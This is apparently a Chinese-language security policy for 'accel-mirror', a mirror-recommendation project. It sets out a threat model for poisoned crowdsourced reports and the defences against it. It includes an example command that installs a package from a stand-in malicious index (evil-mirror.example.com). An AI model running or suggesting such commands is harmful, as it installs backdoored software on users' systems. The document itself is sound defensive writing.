# 安全策略

## 这个项目在安全上的特殊之处

`accel-mirror` 本身不运营任何镜像，它做的是**推荐**：告诉用户"用哪个镜像、执行哪条命令"。
这意味着它的威胁不在代码执行，而在**推荐被污染**。

一个被污染的推荐会造成什么？

```
用户执行:  docker pull docker.1ms.run/library/nginx:latest
实际拉取:  一个被替换过的镜像 → 容器里跑着别人的后门
```

或者：

```
用户执行:  pip install -i https://evil-mirror.example.com/simple requests
实际安装:  一个被植入后门的 requests
```

所以本项目把「**谁能改变推荐结果**」当作核心安全边界来设计，而不是事后加个校验了事。

---

## 威胁模型与现有防线

### 1. 众包上报投毒（本项目最严重的攻击面）

**攻击路径**：本库有一个「网络实测上报」issue 表单，任何人都能提交。若上报可以引入新源，
攻击者只要提交一条「`evil-mirror.example.com`，延迟 5ms」的虚假上报，它就会拿下榜首，
被推荐给每一个用户——这是一条**经由 issue 表单实现的供应链攻击**。

**防线**（构造性，不是过滤器）：入库脚本 `scripts/ingest_report.py` 是信任边界，它：

- 逐行把上报压缩为 `{name, status, time_ms}`，**提交者写的 `url` 一律丢弃**
- 要求 `name` **必须已存在于** `references/mirrors.json`，不存在的源整行丢弃
- 因此上报**只能移动一个已知源的分数，永远不能引入新的 URL**

这条约束由 `scripts/selftest.py` 的多条断言覆盖（`上报不能新增源`、`提交者的 url 不出现在
产物中`、`每行只保留三个字段`），任何一条被改坏 CI 都会变红。

上游影响：即使 GitHub 账号被盗、issue 被伪造，攻击者能做的也只有「把某个已知源的分打高/打低」，
不能把用户导向一个凭空出现的地址。

### 2. 推荐内容被篡改导致用户安装恶意软件

**防线**：

- `SKILL.md`、`AGENTS.md` 把「可执行文件 / 安装包必须校验 SHA256 或发布方签名后才允许执行」
  写成硬规则；`scripts/accel-fetch.sh` 内置 `--sha256` 校验，不匹配就清理文件并视为失败
- 明确禁止推荐**未知的第三方模型代理站**——模型权重被替换（植入后门）的风险远高于省下的带宽
- `scripts/accel-fetch.sh` 对多个可达源探测到的**文件大小做多数投票**，识破返回错误页的"假快"坏源

### 3. 只读 HTTP 接口（`server/`）

**潜在风险**：如果接口提供「帮我探测任意 URL」的能力，部署者就成了一台公网 SSRF 跳板。

**防线**：接口**刻意不提供**该能力。所有端点都是只读的，数据只来自仓库内的 `mirrors.json`，
服务**不发起任何出站请求**。服务可非 root 运行、可 `read_only`，无第三方依赖。

### 4. 隐私

上报文件只含延迟与状态。`meta.privacy` 字段明示不含 IP / 路径 / 用户名 / 设备信息，
且这是**构造性保证**（脚本只写这两个字段）。网络标签里混入 IPv4、盘符路径、家目录时整条丢弃。

### 5. 数据陈旧导致的误导

不算漏洞，但会实际造成损失：镜像存活率变化极快，一个过期的高分排名会把用户导向死链或
已被接管的域名。防线是接口响应里带 `dataset.age_days` 与 `caveats`，数据超过 7 天会明说。

---

## 不在范围内

- **镜像站自身的漏洞或被入侵**：我们不运营镜像。发现某个镜像站返回被篡改的文件，
  请在各自的仓库反馈：请到对应的 issue 报告，**并直接开 issue 通知我们下架该源**——
  这会立刻处理。
- **某个镜像站收集你的日志 / 限速 / 需要登录**：属服务条款问题，但值得开 issue 提醒，
  我们会写进该源的 `notes`。
- 依赖项漏洞：本项目**零第三方依赖**，无此类面。

## 报告一个漏洞

**请使用 GitHub 私密漏洞报告**：

> https://github.com/gitfox-enter/accel-mirror/security/advisories/new

请不要为安全问题开公开 issue（会公开攻击方法）。如果一周内没有回应，可以开一个
**不含利用细节**的公开 issue 说明"已通过私密渠道报告，等待回应"。

请在报告中尽量包含：

- 受影响的文件 / 端点 / 攻击路径
- 最小复现步骤（例如一段能通过入库校验的伪造 issue 正文）
- 你的判断：能造成的最坏后果
- 建议的修复方向（可选）

## 我们的承诺

- 确认收到：**3 天内**
- 评估与初步方案：**7 天内**
- 修复发布：视严重程度，与报告者协商公开时间

如果你愿意，修复发布时会在 commit message 与 release notes 里致谢（也可以匿名）。

## 自动化防线

- 每次 push 运行 `scripts/selftest.py`（含抗投毒、字段最小化、标签清洗、拒收路径断言）
- 每周一次全量镜像存活率巡检（`.github/workflows/mirror-test.yml`），**CI 只记存活、不回写分数**
  （CI 跑在 GitHub 数据中心网络，与国内用户网络不同，用它改分会引入偏差）
- Pages 部署前**先过自检**——脏数据不会出现在线上看板
